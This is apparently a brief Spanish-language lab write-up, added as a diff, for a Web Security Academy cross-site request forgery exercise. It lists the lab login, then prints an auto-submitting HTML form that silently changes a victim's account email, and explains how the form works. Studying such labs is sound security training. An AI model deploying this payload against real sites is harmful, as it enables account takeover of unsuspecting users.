@@ -1,0 +1,25 @@
+primero nos logeamos
+
+user: wiener
+pass: peter
+
+ahora logeamos y vemos que hay algo para cambiar el email, asi que lo interceptamos con burpsuite
+
+ahi vemos el formato de la peticion pero no importa el laboratorio nos pide hacer un exploit en html para entregarselo a la victima
+
+<form method="POST" action="https://0ac2001a049ee43580bf12fd00b400f7.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="smth@web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+esto dice haz un post en tal link y vas a editar, en la pagina lo vemos asi
+
+<input required type="email" name="email" value="">
+
+asi que tenemos que matchear el formato y le decimos, rellename este input type con, lo que le pusimos en value
+y para subir el formulario decimos document.forms[0].submit(); 
+
+y listo
+
